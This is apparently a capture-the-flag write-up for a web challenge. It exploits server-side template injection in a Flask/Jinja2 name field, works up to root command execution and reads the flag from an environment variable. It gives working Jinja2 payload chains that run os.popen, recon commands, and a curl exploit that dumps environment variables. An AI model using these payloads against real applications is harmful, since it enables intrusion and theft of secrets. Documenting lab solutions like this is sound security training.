# SSTI Secrets

- **Category:** web
- **Points:** 300
- **Branch:** `chal/web-ssti-secrets`
- **Target:** `http://54.72.82.22:8040`
- **Status:** ✅ SOLVED

## Flag

```
safctf{287a681f8f9aa898e0743b5b392952b0}
```

Source: container environment variable `FLAG=...` (also present at
`/app/app/flag.txt`).

## Fingerprint

```
Server: Werkzeug/3.1.9 Python/3.11.16   (Flask / Jinja2, container Python 3.10.21)
```

Themed page: **"PLAYER ONE"** arcade — "Choose your player name and step into the
neon scoreboard." One POST field, `name`, echoed as `Welcome, player <name>`.

## The bug: server-side template injection (again)

`name` is interpolated into a Jinja2 template server-side. Same class as
**Templated Malice (:8020)**, but a different container/deployment.

| Payload | Result |
|---|---|
| `{{7*7}}` | `49` |
| `{{7*"7"}}` | `7777777` |
| `{{self}}` | `<TemplateReference None>` |
| `{{config}}` | full Flask `Config` (`SECRET_KEY: None`, no `FLAG` key) |
| `{{request}}` | `<Request 'http://54.72.82.22:8040/' [POST]>` |

`{{config}}` is a dead end here — the flag is **not** in Flask config. `SECRET_KEY`
is `None`, so cookie forgery is also off the table. The box is a pure SSTI→RCE.

## Exploitation

`lipsum.__globals__.os` reaches the real `os` module. No filter is applied —
every derivation works:

```jinja
{{lipsum.__globals__.os.popen("id").read()}}                                  -> uid=0(root)
{{cycler.__init__.__globals__.os.popen("id").read()}}                         -> uid=0(root)
{{lipsum.__globals__.__builtins__.__import__("os").popen("id").read()}}       -> uid=0(root)
{{lipsum["__globals__"]["os"].popen("id").read()}}                            -> uid=0(root)
```

Running as **root**. Recon inside the box:

```bash
$ ls -la /app           # -> app/  requirements.txt
$ ls -la /app/app       # -> flag.txt
$ find / -iname '*flag*' -not -path '/proc/*' -not -path '/sys/*'
/app/app/flag.txt
$ env
...
FLAG=safctf{287a681f8f9aa898e0743b5b392952b0}
```

The env var is the intended "secret" (hence *SSTI **Secrets***) — the flag is passed
into the container rather than left in a file the app reads.

### Extraction gotcha

The rendered output is HTML-escaped and the command output contains newlines, so a
flat `grep` for `Welcome, player [^<]*` only returns the first line. Grab the region
between `Welcome, player` and `</h2>` and `html.unescape()` it — see `solve.py`.

## Exploit

```bash
curl -s -X POST http://54.72.82.22:8040/ \
  --data-urlencode 'name={{lipsum.__globals__.os.popen("env").read()}}'
```

See `solve.py`.
